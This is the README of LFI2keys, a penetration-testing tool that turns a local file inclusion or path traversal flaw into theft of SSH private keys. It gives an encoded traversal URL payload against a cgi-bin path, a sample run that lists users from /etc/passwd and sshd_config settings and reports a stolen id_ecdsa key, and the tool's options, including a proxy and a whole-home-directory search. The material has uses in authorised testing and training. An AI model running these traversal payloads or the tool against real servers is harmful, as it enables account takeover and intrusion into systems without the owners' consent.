## Summary
Found a local file inclusion or path traversal vulnerability? Automate the extraction of SSH private keys with LFI2keys. It uses the exposed `/etc/passwd` file to extract valid users, checks for commonly named SSH keys, and gathers useful SSH configuration details from `/etc/ssh/sshd_config`.

## Usage
Provide the full URL of the vulnerable endpoint where you can read the `/etc/passwd` file, and supply a private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists). Use the `-v` parameter for verbose output and for printing the found private key.

```bash
┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-medium.txt -o keys.txt

  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\ \ / / __|
 | |__| _| | | / /| ' <| _| \ V /\__ \
 |____|_| |___/___|_|\_\___| |_| |___/

LFI to SSH Private Keys - Automated Looting Script

[+] Valid /etc/passwd file found
[+] Valid users exported:
    miranda -> /home/miranda
    steven -> /home/steven
    mark -> /home/mark
    nick -> /home/nick
[+] /etc/ssh/sshd_config file found
    PermitRootLogin: disabled
    PubkeyAuthentication: enabled
    PasswordAuthentication: disabled
    ChallengeResponseAuthentication: disabled
[+] Checking for SSH metadata (authorized_keys and known_hosts)...
[!] Found authorized_keys for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/authorized_keys
[+] Starting to FUZZ
[+] Private key found for nick at: https://127.0.0.1/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/nick/.ssh/id_ecdsa
[+] Results saved to keys.txt
[+] Done (～￣▽￣)～
```

## Options
```bash
  -h, --help            show this help message and exit
  -u URL, --url URL     LFI URL pointing to /etc/passwd
  -l LIST, --list LIST  Wordlist containing SSH private key names
  -o OUTPUT, --output OUTPUT
                        File to save found private key URLs and contents
  -p PROXY, --proxy PROXY
                        Proxy URL (e.g., http://127.0.0.1:8080)
  -v, --verbose         Enable verbose mode for debugging
  -a, --all             Also search the entire home directory (not just .ssh folder)
  -c, --continue-on-success
                        Continue scanning all users for private keys even after a match is found
```

### Credits
- [PinoyWH1Z](https://github.com/PinoyWH1Z) for his [SSH private key wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists).
